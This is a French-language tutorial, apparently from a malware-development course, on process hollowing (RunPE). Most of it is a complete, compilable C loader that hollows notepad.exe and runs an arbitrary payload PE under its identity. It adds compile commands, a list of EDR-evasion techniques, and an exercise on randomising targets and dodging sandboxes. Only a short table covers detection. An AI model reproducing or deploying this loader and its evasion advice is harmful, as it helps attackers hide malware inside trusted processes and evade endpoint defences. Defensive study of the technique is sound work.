# Process Hollowing - RunPE

## Introduction

Le **Process Hollowing** (aussi appelé RunPE) est une technique d'injection de code qui consiste à :
1. Créer un processus légitime en état **suspendu**
2. **Vider** (unmapper) son image mémoire
3. **Remplacer** par notre payload malveillant
4. **Reprendre** l'exécution

Cette technique est utilisée par des malwares comme TrickBot, Emotet, et de nombreux RATs.

---

## Théorie : Pourquoi ça marche ?

### Le problème à résoudre
- Les EDR/AV surveillent les processus suspects
- Un `malware.exe` qui fait des actions malveillantes → détecté
- Un `svchost.exe` qui fait les mêmes actions → plus discret

### La solution
On "vole" l'identité d'un processus légitime Windows :
```
notepad.exe (légitime) → notre code s'exécute dedans
svchost.exe (légitime) → notre code s'exécute dedans
```

### Flux d'exécution

```
┌─────────────────────────────────────────────────────────────────┐
│                    PROCESS HOLLOWING                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. CreateProcess(SUSPENDED)     2. NtUnmapViewOfSection        │
│  ┌──────────────┐                ┌──────────────┐               │
│  │ notepad.exe  │                │   [VIDE]     │               │
│  │ ┌──────────┐ │                │              │               │
│  │ │ .text    │ │   ─────────►   │              │               │
│  │ │ .data    │ │    Unmap       │              │               │
│  │ │ .rdata   │ │                │              │               │
│  │ └──────────┘ │                └──────────────┘               │
│  └──────────────┘                                               │
│                                                                 │
│  3. VirtualAllocEx + WriteProcessMemory                         │
│  ┌──────────────┐                                               │
│  │  notepad.exe │  ◄── PID/Nom restent identiques               │
│  │ ┌──────────┐ │                                               │
│  │ │ MALWARE  │ │  ◄── Mais le code est le nôtre !              │
│  │ │  CODE    │ │                                               │
│  │ │  .....   │ │                                               │
│  │ └──────────┘ │                                               │
│  └──────────────┘                                               │
│                                                                 │
│  4. SetThreadContext + ResumeThread                             │
│     → Le "notepad.exe" exécute notre malware                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Les APIs Windows utilisées

| Fonction | Rôle | DLL |
|----------|------|-----|
| `CreateProcessA/W` | Créer le processus suspendu | kernel32.dll |
| `NtUnmapViewOfSection` | Vider l'image mémoire | ntdll.dll |
| `VirtualAllocEx` | Allouer mémoire dans le processus cible | kernel32.dll |
| `WriteProcessMemory` | Écrire notre PE dans le processus | kernel32.dll |
| `GetThreadContext` | Récupérer le contexte du thread | kernel32.dll |
| `SetThreadContext` | Modifier EIP/RIP vers notre entry point | kernel32.dll |
| `ResumeThread` | Reprendre l'exécution | kernel32.dll |

---

## Implémentation complète

### Structures nécessaires

```c
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Prototype de NtUnmapViewOfSection (non documentée)
typedef NTSTATUS (NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

// Structure PE simplifiée pour notre usage
typedef struct _PE_HEADERS {
    PIMAGE_DOS_HEADER     pDosHeader;
    PIMAGE_NT_HEADERS     pNtHeaders;
    PIMAGE_SECTION_HEADER pSectionHeader;
    PVOID                 pImageBase;
    DWORD                 dwImageSize;
    DWORD                 dwEntryPoint;
} PE_HEADERS, *PPE_HEADERS;
```

### Fonction 1 : Parser le PE à injecter

```c
/**
 * ParsePE - Parse les headers d'un fichier PE en mémoire
 *
 * @param pFileBuffer : Buffer contenant le PE (lu depuis fichier ou ressource)
 * @param pPeHeaders  : Structure de sortie avec les infos parsées
 *
 * @return TRUE si succès, FALSE sinon
 */
BOOL ParsePE(PVOID pFileBuffer, PPE_HEADERS pPeHeaders) {

    // 1. Vérifier le magic DOS "MZ"
    pPeHeaders->pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;

    if (pPeHeaders->pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Signature DOS invalide (attendu: MZ)\n");
        return FALSE;
    }

    // 2. Localiser le header NT via e_lfanew
    // e_lfanew contient l'offset vers le header PE
    pPeHeaders->pNtHeaders = (PIMAGE_NT_HEADERS)(
        (BYTE*)pFileBuffer + pPeHeaders->pDosHeader->e_lfanew
    );

    // 3. Vérifier le magic PE "PE\0\0"
    if (pPeHeaders->pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Signature PE invalide (attendu: PE\\0\\0)\n");
        return FALSE;
    }

    // 4. Récupérer les informations importantes
    pPeHeaders->pImageBase = (PVOID)pPeHeaders->pNtHeaders->OptionalHeader.ImageBase;
    pPeHeaders->dwImageSize = pPeHeaders->pNtHeaders->OptionalHeader.SizeOfImage;
    pPeHeaders->dwEntryPoint = pPeHeaders->pNtHeaders->OptionalHeader.AddressOfEntryPoint;

    // 5. Localiser la première section
    pPeHeaders->pSectionHeader = IMAGE_FIRST_SECTION(pPeHeaders->pNtHeaders);

    printf("[+] PE parsé avec succès:\n");
    printf("    ImageBase    : 0x%p\n", pPeHeaders->pImageBase);
    printf("    ImageSize    : 0x%X\n", pPeHeaders->dwImageSize);
    printf("    EntryPoint   : 0x%X\n", pPeHeaders->dwEntryPoint);
    printf("    Sections     : %d\n", pPeHeaders->pNtHeaders->FileHeader.NumberOfSections);

    return TRUE;
}
```

### Fonction 2 : Créer le processus cible suspendu

```c
/**
 * CreateSuspendedProcess - Crée un processus en état suspendu
 *
 * @param szProcessPath : Chemin vers l'exécutable légitime (ex: "C:\\Windows\\System32\\notepad.exe")
 * @param pPi           : PROCESS_INFORMATION de sortie
 * @param pSi           : STARTUPINFO de sortie
 *
 * @return TRUE si succès
 */
BOOL CreateSuspendedProcess(LPCSTR szProcessPath, PPROCESS_INFORMATION pPi, PSTARTUPINFOA pSi) {

    // Initialiser les structures
    ZeroMemory(pSi, sizeof(STARTUPINFOA));
    ZeroMemory(pPi, sizeof(PROCESS_INFORMATION));
    pSi->cb = sizeof(STARTUPINFOA);

    // Créer le processus avec le flag CREATE_SUSPENDED
    // Le thread principal ne s'exécutera pas tant qu'on n'appelle pas ResumeThread
    if (!CreateProcessA(
        szProcessPath,          // Chemin de l'exécutable
        NULL,                   // Ligne de commande
        NULL,                   // Attributs de sécurité processus
        NULL,                   // Attributs de sécurité thread
        FALSE,                  // Hériter les handles
        CREATE_SUSPENDED,       // <-- FLAG IMPORTANT : processus suspendu
        NULL,                   // Environnement
        NULL,                   // Répertoire courant
        pSi,                    // STARTUPINFO
        pPi                     // PROCESS_INFORMATION
    )) {
        printf("[-] CreateProcessA échoué : %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Processus créé en état suspendu\n");
    printf("    PID    : %d\n", pPi->dwProcessId);
    printf("    Handle : 0x%p\n", pPi->hProcess);

    return TRUE;
}
```

### Fonction 3 : Hollowing - Le cœur de la technique

```c
/**
 * HollowProcess - Effectue le process hollowing complet
 *
 * @param pPi         : PROCESS_INFORMATION du processus cible
 * @param pPayload    : Buffer contenant le PE malveillant
 * @param dwPayloadSize : Taille du payload
 *
 * @return TRUE si succès
 */
BOOL HollowProcess(PPROCESS_INFORMATION pPi, PVOID pPayload, DWORD dwPayloadSize) {

    CONTEXT ctx;
    PVOID pRemoteImageBase = NULL;
    PVOID pNewImageBase = NULL;
    PE_HEADERS peHeaders;
    SIZE_T bytesWritten;

    // ===== ÉTAPE 1 : Parser le payload PE =====
    printf("\n[*] Étape 1 : Parsing du payload PE...\n");
    if (!ParsePE(pPayload, &peHeaders)) {
        return FALSE;
    }

    // ===== ÉTAPE 2 : Récupérer le contexte du thread =====
    // Le contexte contient les registres (dont RDX qui pointe vers le PEB)
    printf("\n[*] Étape 2 : Récupération du contexte thread...\n");
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pPi->hThread, &ctx)) {
        printf("[-] GetThreadContext échoué : %d\n", GetLastError());
        return FALSE;
    }

#ifdef _WIN64
    printf("[+] RCX (EntryPoint) : 0x%llX\n", ctx.Rcx);
    printf("[+] RDX (PEB)        : 0x%llX\n", ctx.Rdx);

    // Lire l'ImageBase depuis le PEB (offset 0x10 en x64)
    // PEB->ImageBaseAddress est à PEB+0x10
    if (!ReadProcessMemory(pPi->hProcess,
                           (PVOID)(ctx.Rdx + 0x10),  // PEB + offset ImageBase
                           &pRemoteImageBase,
                           sizeof(PVOID),
                           NULL)) {
        printf("[-] Lecture ImageBase depuis PEB échouée\n");
        return FALSE;
    }
#else
    printf("[+] EAX (EntryPoint) : 0x%lX\n", ctx.Eax);
    printf("[+] EBX (PEB)        : 0x%lX\n", ctx.Ebx);

    // En x86, l'offset est 0x8
    if (!ReadProcessMemory(pPi->hProcess,
                           (PVOID)(ctx.Ebx + 0x8),
                           &pRemoteImageBase,
                           sizeof(PVOID),
                           NULL)) {
        printf("[-] Lecture ImageBase depuis PEB échouée\n");
        return FALSE;
    }
#endif

    printf("[+] ImageBase du processus cible : 0x%p\n", pRemoteImageBase);

    // ===== ÉTAPE 3 : Unmap de l'image originale =====
    printf("\n[*] Étape 3 : Unmapping de l'image originale...\n");

    // Charger NtUnmapViewOfSection depuis ntdll.dll
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");

    if (!NtUnmapViewOfSection) {
        printf("[-] Impossible de résoudre NtUnmapViewOfSection\n");
        return FALSE;
    }

    // Unmapper l'image originale
    NTSTATUS status = NtUnmapViewOfSection(pPi->hProcess, pRemoteImageBase);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtUnmapViewOfSection échoué : 0x%X\n", status);
        // Continuer quand même, on peut allouer ailleurs
    } else {
        printf("[+] Image originale unmappée avec succès\n");
    }

    // ===== ÉTAPE 4 : Allouer de la mémoire pour notre payload =====
    printf("\n[*] Étape 4 : Allocation mémoire pour le payload...\n");

    // Essayer d'allouer à l'adresse préférée du PE
    pNewImageBase = VirtualAllocEx(
        pPi->hProcess,
        peHeaders.pImageBase,           // Adresse préférée
        peHeaders.dwImageSize,          // Taille de l'image
        MEM_COMMIT | MEM_RESERVE,       // Type d'allocation
        PAGE_EXECUTE_READWRITE          // Protection RWX
    );

    // Si l'adresse préférée n'est pas disponible, allouer ailleurs
    if (!pNewImageBase) {
        printf("[!] Allocation à l'adresse préférée échouée, tentative ailleurs...\n");
        pNewImageBase = VirtualAllocEx(
            pPi->hProcess,
            NULL,                       // Laisser Windows choisir
            peHeaders.dwImageSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    }

    if (!pNewImageBase) {
        printf("[-] VirtualAllocEx échoué : %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Mémoire allouée à : 0x%p\n", pNewImageBase);

    // ===== ÉTAPE 5 : Écrire les headers PE =====
    printf("\n[*] Étape 5 : Écriture des headers PE...\n");

    // Calculer la différence pour le rebasing si nécessaire
    DWORD_PTR deltaBase = (DWORD_PTR)pNewImageBase - (DWORD_PTR)peHeaders.pImageBase;

    if (deltaBase != 0) {
        printf("[!] Rebasing nécessaire, delta : 0x%llX\n", (ULONGLONG)deltaBase);
        // Mettre à jour l'ImageBase dans les headers
        peHeaders.pNtHeaders->OptionalHeader.ImageBase = (DWORD_PTR)pNewImageBase;
    }

    // Écrire les headers (DOS + NT + Section headers)
    if (!WriteProcessMemory(
        pPi->hProcess,
        pNewImageBase,
        pPayload,
        peHeaders.pNtHeaders->OptionalHeader.SizeOfHeaders,
        &bytesWritten
    )) {
        printf("[-] Écriture des headers échouée : %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Headers écrits : %zu bytes\n", bytesWritten);

    // ===== ÉTAPE 6 : Écrire chaque section =====
    printf("\n[*] Étape 6 : Écriture des sections...\n");

    PIMAGE_SECTION_HEADER pSection = peHeaders.pSectionHeader;
    WORD numberOfSections = peHeaders.pNtHeaders->FileHeader.NumberOfSections;

    for (WORD i = 0; i < numberOfSections; i++) {
        // Calculer les adresses
        PVOID pSectionDest = (PVOID)((BYTE*)pNewImageBase + pSection[i].VirtualAddress);
        PVOID pSectionSrc = (PVOID)((BYTE*)pPayload + pSection[i].PointerToRawData);
        DWORD dwSectionSize = pSection[i].SizeOfRawData;

        // Ignorer les sections vides
        if (dwSectionSize == 0) continue;

        printf("    [%d] %-8.8s : 0x%p -> 0x%p (%d bytes)\n",
               i,
               pSection[i].Name,
               pSectionSrc,
               pSectionDest,
               dwSectionSize);

        if (!WriteProcessMemory(
            pPi->hProcess,
            pSectionDest,
            pSectionSrc,
            dwSectionSize,
            &bytesWritten
        )) {
            printf("[-] Écriture section %s échouée : %d\n", pSection[i].Name, GetLastError());
            return FALSE;
        }
    }

    printf("[+] Toutes les sections écrites\n");

    // ===== ÉTAPE 7 : Appliquer les relocations si nécessaire =====
    if (deltaBase != 0) {
        printf("\n[*] Étape 7 : Application des relocations...\n");

        // Récupérer le répertoire des relocations
        DWORD relocRVA = peHeaders.pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD relocSize = peHeaders.pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

        if (relocRVA && relocSize) {
            // Lire la table de relocations depuis le processus distant
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pPayload + relocRVA);
            DWORD relocParsed = 0;

            while (relocParsed < relocSize && pReloc->VirtualAddress) {
                DWORD numEntries = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD pEntry = (PWORD)((BYTE*)pReloc + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD j = 0; j < numEntries; j++) {
                    WORD type = pEntry[j] >> 12;
                    WORD offset = pEntry[j] & 0x0FFF;

                    if (type == IMAGE_REL_BASED_DIR64 || type == IMAGE_REL_BASED_HIGHLOW) {
                        PVOID pPatchAddr = (PVOID)((BYTE*)pNewImageBase + pReloc->VirtualAddress + offset);
                        DWORD_PTR patchValue;

                        // Lire la valeur actuelle
                        ReadProcessMemory(pPi->hProcess, pPatchAddr, &patchValue, sizeof(DWORD_PTR), NULL);
                        // Appliquer le delta
                        patchValue += deltaBase;
                        // Écrire la nouvelle valeur
                        WriteProcessMemory(pPi->hProcess, pPatchAddr, &patchValue, sizeof(DWORD_PTR), NULL);
                    }
                }

                relocParsed += pReloc->SizeOfBlock;
                pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
            }

            printf("[+] Relocations appliquées\n");
        }
    }

    // ===== ÉTAPE 8 : Mettre à jour le PEB avec la nouvelle ImageBase =====
    printf("\n[*] Étape 8 : Mise à jour du PEB...\n");

#ifdef _WIN64
    if (!WriteProcessMemory(pPi->hProcess, (PVOID)(ctx.Rdx + 0x10), &pNewImageBase, sizeof(PVOID), NULL)) {
#else
    if (!WriteProcessMemory(pPi->hProcess, (PVOID)(ctx.Ebx + 0x8), &pNewImageBase, sizeof(PVOID), NULL)) {
#endif
        printf("[-] Mise à jour PEB échouée\n");
        return FALSE;
    }
    printf("[+] PEB mis à jour\n");

    // ===== ÉTAPE 9 : Modifier le contexte pour pointer vers notre EntryPoint =====
    printf("\n[*] Étape 9 : Modification du contexte thread...\n");

    DWORD_PTR newEntryPoint = (DWORD_PTR)pNewImageBase + peHeaders.dwEntryPoint;

#ifdef _WIN64
    ctx.Rcx = newEntryPoint;
    printf("[+] Nouveau RCX (EntryPoint) : 0x%llX\n", ctx.Rcx);
#else
    ctx.Eax = (DWORD)newEntryPoint;
    printf("[+] Nouveau EAX (EntryPoint) : 0x%lX\n", ctx.Eax);
#endif

    if (!SetThreadContext(pPi->hThread, &ctx)) {
        printf("[-] SetThreadContext échoué : %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Contexte thread mis à jour\n");

    // ===== ÉTAPE 10 : Reprendre l'exécution =====
    printf("\n[*] Étape 10 : Reprise de l'exécution...\n");

    if (ResumeThread(pPi->hThread) == (DWORD)-1) {
        printf("[-] ResumeThread échoué : %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Thread repris ! Le payload s'exécute maintenant.\n");

    return TRUE;
}
```

### Fonction main : Assembler le tout

```c
/**
 * Exemple d'utilisation - Lit un PE depuis un fichier et l'injecte dans notepad.exe
 */
int main(int argc, char* argv[]) {

    printf("===========================================\n");
    printf("       PROCESS HOLLOWING DEMONSTRATION     \n");
    printf("===========================================\n\n");

    if (argc < 2) {
        printf("Usage: %s <payload.exe>\n", argv[0]);
        return 1;
    }

    // ===== Lire le payload depuis le fichier =====
    printf("[*] Lecture du payload : %s\n", argv[1]);

    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Impossible d'ouvrir le fichier : %d\n", GetLastError());
        return 1;
    }

    DWORD dwFileSize = GetFileSize(hFile, NULL);
    PVOID pPayload = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    DWORD bytesRead;
    ReadFile(hFile, pPayload, dwFileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    printf("[+] Payload lu : %d bytes\n", dwFileSize);

    // ===== Créer le processus cible =====
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;

    // Utiliser un processus Windows légitime
    char szTarget[] = "C:\\Windows\\System32\\notepad.exe";

    printf("\n[*] Création du processus cible : %s\n", szTarget);

    if (!CreateSuspendedProcess(szTarget, &pi, &si)) {
        VirtualFree(pPayload, 0, MEM_RELEASE);
        return 1;
    }

    // ===== Effectuer le hollowing =====
    if (!HollowProcess(&pi, pPayload, dwFileSize)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        VirtualFree(pPayload, 0, MEM_RELEASE);
        return 1;
    }

    // ===== Cleanup =====
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    VirtualFree(pPayload, 0, MEM_RELEASE);

    printf("\n[+] Process Hollowing terminé avec succès !\n");
    printf("[+] Le payload s'exécute maintenant sous l'identité de %s\n", szTarget);

    return 0;
}
```

---

## Compilation

```bash
# MinGW (x64)
x86_64-w64-mingw32-gcc -o hollow.exe process_hollowing.c -lntdll

# Visual Studio (x64 Native Tools Command Prompt)
cl.exe /EHsc process_hollowing.c /link ntdll.lib
```

---

## Détection et contournement

### Comment les EDR détectent cette technique

| Indicateur | Méthode de détection |
|------------|---------------------|
| `CREATE_SUSPENDED` | Hook sur CreateProcess |
| `NtUnmapViewOfSection` | Hook ntdll |
| Memory RWX | Scan mémoire |
| Contexte thread modifié | Monitoring SetThreadContext |
| ImageBase ≠ fichier sur disque | Comparaison mémoire/disque |

### Techniques d'évasion (Module 14)

1. **Direct Syscalls** : Éviter les hooks ntdll
2. **Process Doppelgänging** : Utiliser les transactions NTFS
3. **Process Herpaderping** : Modifier le fichier après mapping
4. **Module Stomping** : Écraser un module légitime chargé

---

## Exercice

Créer une version modifiée qui :
1. Lit le payload depuis une ressource PE au lieu d'un fichier
2. Choisit aléatoirement parmi plusieurs processus cibles
3. Ajoute un délai avant le ResumeThread pour éviter les sandbox

---

## Références

- [MITRE ATT&CK T1055.012](https://attack.mitre.org/techniques/T1055/012/)
- [m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing)
- [ired.team - Process Hollowing](https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations)
